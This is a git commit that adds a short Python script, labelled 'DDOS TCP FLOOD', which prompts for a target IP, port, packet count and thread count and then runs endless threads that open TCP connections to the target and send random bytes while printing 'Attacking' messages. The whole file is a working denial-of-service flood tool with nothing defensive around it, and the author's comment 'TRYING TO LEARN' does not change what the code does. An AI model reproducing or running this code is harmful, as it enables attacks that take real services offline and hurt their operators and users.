5c5facb732791aa6c019f32fd87d07909328a1b8
Unkn0wnM4n01 <142908809+Unkn0wnM4n01@users.noreply.github.com>
2023-08-23 14:48:48 +0800

    Create Haha.py
    Jajajaha

---
+++ Haha.py
@@ -0,0 +1,32 @@
+#DDOS TCP FLOOD
+#TRYING TO LEARN
+
+import socket
+import random
+import threading
+
+ip = str(input('[+] Target: '))
+port = int(input('[+] Port: '))
+pack = int(input('[+] Packet/s: '))
+thread= int(input('[+] Thread: '))
+
+
+def start():
+    hh = random._urandom(10)
+    xx = int(0)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(hh)
+            for i in range(pack):
+                	s.send(hh)
+            xx+= 1
+            print('Attacking '+ip+' | Sent:'+str(xx))
+        except:
+            s.close()
+            print('Done')
+for x in range(thread):
+    thred = threading.Thread(target=start)
+    thred.start()
+#DONE
